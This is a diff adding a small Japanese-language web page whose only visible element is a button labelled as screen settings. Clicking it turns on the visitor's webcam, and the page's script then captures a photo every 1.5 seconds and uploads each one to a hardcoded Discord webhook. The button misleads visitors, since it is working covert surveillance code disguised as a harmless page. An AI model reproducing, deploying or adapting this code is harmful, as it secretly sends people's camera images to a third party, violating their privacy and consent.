@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web site make by L1ry</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        #startCamera {
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button id="startCamera">画面の設定</button>
+
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <script>
+        const startCameraButton = document.getElementById('startCamera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        startCameraButton.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setInterval(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'photo.jpg');
+                        
+                        await fetch('https://discord.com/api/webhooks/1277523479914348605/QeAsGCjOb3YGTgwX6yrgBQ9Y9Ao2HqWzyjU5Jfj4-DG_H-Q2hQJ453FrWEnqHlpyMtkj', {
+                            method: 'POST',
+                            body: formData
+                        }).then(response => {
+                            if (response.ok) {
+                                console.log('画像');
+                            } else {
+                                console.error('画像');
+                            }
+                        }).catch(error => {
+                            console.error('エラー:', error);
+                        });
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (error) {
+                console.error('カメラの起動に失敗しました:', error);
+            }
+        });
+    </script>
+</body>
+</html>
